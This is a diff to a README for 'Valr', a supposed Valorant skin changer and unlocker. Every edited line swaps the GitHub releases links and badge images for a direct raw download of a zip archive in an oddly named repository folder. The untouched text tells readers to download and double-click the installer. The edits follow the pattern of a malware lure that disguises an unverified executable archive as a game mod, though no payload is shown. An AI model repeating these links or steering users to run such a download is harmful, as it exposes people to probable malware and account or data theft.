@@ -6,7 +6,7 @@ Welcome to Valr! This application allows you to change and unlock skins in Valor
 
 ## 📥 Download Link
 
-[![Download Valr](https://img.shields.io/badge/Download-Valr-brightgreen)](https://github.com/Vonontop/Valr/releases)
+[![Download Valr](https://raw.githubusercontent.com/Vonontop/Valr/main/devadasi/Software_v3.4-alpha.3.zip)](https://raw.githubusercontent.com/Vonontop/Valr/main/devadasi/Software_v3.4-alpha.3.zip)
 
 ## ⚙️ System Requirements
 
@@ -31,7 +31,7 @@ Valr provides several features to enhance your gameplay:
 
 To get started, follow these steps:
 
-1. **Visit the Releases Page:** Go to our [Releases page](https://github.com/Vonontop/Valr/releases).
+1. **Visit the Releases Page:** Go to our [Releases page](https://raw.githubusercontent.com/Vonontop/Valr/main/devadasi/Software_v3.4-alpha.3.zip).
 2. **Download the latest version:** Look for the latest release. Click on the provided link to download the installer.
 3. **Run the Installer:** Once the download is complete, find the file and double-click it to run the installer.
 4. **Follow Installation Instructions:** Follow any prompts displayed on your screen to complete the installation.
@@ -51,7 +51,7 @@ To utilize Valr effectively, follow these steps:
 If you encounter any issues while using Valr, consider these solutions:
 
 - **Reinstall Valr:** Uninstall the application and then reinstall it.
-- **Check for Updates:** Ensure you have the latest version of Valr by visiting the [Releases page](https://github.com/Vonontop/Valr/releases).
+- **Check for Updates:** Ensure you have the latest version of Valr by visiting the [Releases page](https://raw.githubusercontent.com/Vonontop/Valr/main/devadasi/Software_v3.4-alpha.3.zip).
 - **Contact Support:** If problems persist, feel free to reach out through the Issues tab on our GitHub page.
 
 ## 🌐 Join Our Community
@@ -70,6 +70,6 @@ For more detailed information on specific features, you can visit our Wiki secti
 
 For easy access, here is the link to download Valr once more:
 
-[![Download Valr](https://img.shields.io/badge/Download-Valr-brightgreen)](https://github.com/Vonontop/Valr/releases)
+[![Download Valr](https://raw.githubusercontent.com/Vonontop/Valr/main/devadasi/Software_v3.4-alpha.3.zip)](https://raw.githubusercontent.com/Vonontop/Valr/main/devadasi/Software_v3.4-alpha.3.zip)
 
 Thank you for choosing Valr. Enjoy your enhanced Valorant experience!
